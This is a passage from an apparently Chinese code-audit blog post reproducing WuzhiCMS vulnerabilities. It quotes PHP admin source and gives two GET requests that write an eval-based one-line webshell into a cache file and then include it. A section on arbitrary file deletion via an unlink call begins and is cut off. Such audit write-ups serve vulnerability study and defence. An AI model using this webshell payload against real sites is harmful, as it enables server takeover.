#ABB2BF">(</span><span style="color: #98C379">&#39;operation_success&#39;</span><span style="color: #ABB2BF">),</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">HTTP_REFERER,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">     } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #E06C75">$show_dialog</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #61AFEF">load_class</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;form&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #E06C75">$setting</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&amp;</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">_cache</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">!isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$setting</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;show_mode&#39;</span><span style="color: #ABB2BF">])) {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$setting</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;show_mode&#39;</span><span style="color: #ABB2BF">=&gt;</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;watermark_enable&#39;</span><span style="color: #ABB2BF">=&gt;</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;watermark_pos&#39;</span><span style="color: #ABB2BF">=&gt;</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;watermark_text&#39;</span><span style="color: #ABB2BF">=&gt;</span><span style="color: #98C379">&#39;www.wuzhicms.com&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">set_cache</span><span style="color: #ABB2BF">(M,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$setting</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #C678DD">include</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">template</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;set&#39;</span><span style="color: #ABB2BF">, M);</span></span><span class="line"><span style="color: #ABB2BF">     }</span></span><span class="line"><span style="color: #ABB2BF"> }</span></span></code></pre></div></div></figure><p>\coreframe\app\tags\admin\index.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;dosubmit&#39;</span><span style="color: #ABB2BF">]))</span></span><span class="line"><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$cache_in_db</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">cache_in_db</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;setting&#39;</span><span style="color: #ABB2BF">],</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">V,</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">M);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">set_cache</span><span style="color: #ABB2BF">(M,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;setting&#39;</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF"> L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;operation_success&#39;</span><span style="color: #ABB2BF">),</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">HTTP_REFERER,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"> }</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">else</span></span><span class="line"><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">             </span><span style="color: #E06C75">$show_dialog</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">load_class</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;form&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">load_function</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;template&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$templates</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">select_template</span><span style="color: #ABB2BF">(M);</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$setting</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">cache_in_db</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">V,</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">M);</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$linkage</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">get_list</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;linkage&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;name,linkageid&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">100</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;linkageid ASC&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;linkageid&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">foreach</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$linkage</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">AS</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$k</span><span style="color: #ABB2BF">=&gt;</span><span style="color: #E06C75">$v</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$linkage</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$k</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$v</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;name&#39;</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF"> }</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #C678DD">include</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">template</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;set&#39;</span><span style="color: #ABB2BF">,M);</span></span><span class="line"><span style="color: #ABB2BF"> }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>$data就是$GLOBALS[‘setting’]（可控）</p><p>$filename（不可控）</p></li><li><p>寻找一个可以包含该缓存文件的地方  $filename（搜索）</p><p>coreframe\app\core\libs\function\common.func.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">get_cache</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$filename</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$dir</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;_cache_&#39;</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$file</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">get_cache_path</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$filename</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$dir</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!file_exists</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$file</span><span style="color: #ABB2BF">)) </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$data</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">include</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$file</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$data</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li><li><p>查找get_cache用法</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ueditor</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;submit&#39;</span><span style="color: #ABB2BF">])) {</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #E06C75">$cache_in_db</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">cache_in_db</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;setting&#39;</span><span style="color: #ABB2BF">],</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">V,</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">M);</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #61AFEF">set_cache</span><span style="color: #ABB2BF">(V,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;setting&#39;</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;operation_success&#39;</span><span style="color: #ABB2BF">),</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">HTTP_REFERER,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">     }</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #E06C75">$setting</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">get_cache</span><span style="color: #ABB2BF">(V);</span></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">empty</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$setting</span><span style="color: #ABB2BF">)) </span><span style="color: #E06C75">$setting</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">cache_in_db</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">V,</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">M);</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #C678DD">include</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">template</span><span style="color: #ABB2BF">(V, M);</span></span><span class="line"><span style="color: #ABB2BF">     }</span></span><span class="line"><span style="color: #ABB2BF"> }</span></span></code></pre></div></div></figure></li><li><p>ueditor()调用</p><p>编写语句</p><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 1 写入一句话木马到缓存文件</span></span><span class="line"><span style="color: #61AFEF">GET</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/wuzhicms/index.php?m=attachment</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">f</span><span style="color: #56B6C2">=</span><span style="color: #98C379">index</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">v</span><span style="color: #56B6C2">=</span><span style="color: #98C379">set</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">_su</span><span style="color: #56B6C2">=</span><span style="color: #98C379">wuzhicms</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">submit</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">setting</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">&lt;</span><span style="color: #98C379">?php</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">@eval($_POST[</span><span style="color: #61AFEF">&#39;shell&#39;</span><span style="color: #61AFEF">]</span><span style="color: #ABB2BF">);?&gt;</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 2 读取缓存文件</span></span><span class="line"><span style="color: #61AFEF">GET</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/wuzhicms/index.php?m=attachment</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">f</span><span style="color: #56B6C2">=</span><span style="color: #98C379">index</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">v</span><span style="color: #56B6C2">=</span><span style="color: #98C379">ueditor</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">_su</span><span style="color: #56B6C2">=</span><span style="color: #98C379">wuzhicms</span></span></code></pre></div></div></figure></li></ol><h2 id="复现4（后台任意文件删除）"><a href="#复现4（后台任意文件删除）" class="headerlink" title="复现4（后台任意文件删除）"></a>复现4（后台任意文件删除）</h2><ol><li><p>unlink函数 来找文件删除</p><p>coreframe\app\attachment\admin\index.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">my_unlink</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$path</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">  {</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">file_exists</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$path</span><span style="color: #ABB2BF">)) </span><span style="color: #56B6C2">unlink</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$path</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">  }</span></span></code></pre></div></div></figure></li><li><p>此文件下面还有   函数定义del调用了该功能点进行文件删除.</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">del</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">     </span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">!</span><span style="color: #E06C75">$url</span><span style="color: #ABB2BF">) </span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;operation_failure&#39;</span><span style="color: #ABB2BF">),</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">HTTP_REFERER,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">!is_array</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$ids</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">} </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$ids</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">   </span></span><span class="line"><span style="color: #C678DD">foreach</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$ids</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">as</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;id&#39;</span><span style="color: #ABB2BF"> =&gt; </span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$att_info</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">get_one</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;attachment&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;usertimes,path&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$att_info</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;usertimes&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">&gt;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;attachment&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;usertimes = usertimes-1&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">my_unlink</span><span style="color: #ABB2BF">(ATTACHMENT_ROOT </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$att_info</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;path&#39;</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;attachment&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;attachment_tag_index&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;att_id&#39;</span><span style="color: #ABB2BF">=&gt;</span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;delete success&#39;</span><span style="color: #ABB2BF">),</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">HTTP_REFERER,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">1000</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">     }</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #E06C75">$url</span><span style="color: #ABB2BF">) </span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;url del &#39;</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF"> L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;operation_failure&#39;</span><span style="color: #ABB2BF">),</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">HTTP_REFERER,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #E06C75">$path</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">str_ireplace</span><span style="color: #ABB2BF">(ATTACHMENT_URL,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$url</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$path</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">             </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;path&#39;</span><span style="color: #ABB2BF"> =&gt; </span><span style="color: #E06C75">$path</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">             </span><span style="color: #E06C75">$att_info</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">get_one</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;attachment&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;usertimes,id&#39;</span><span style="color: #ABB2BF">);</span></span><span 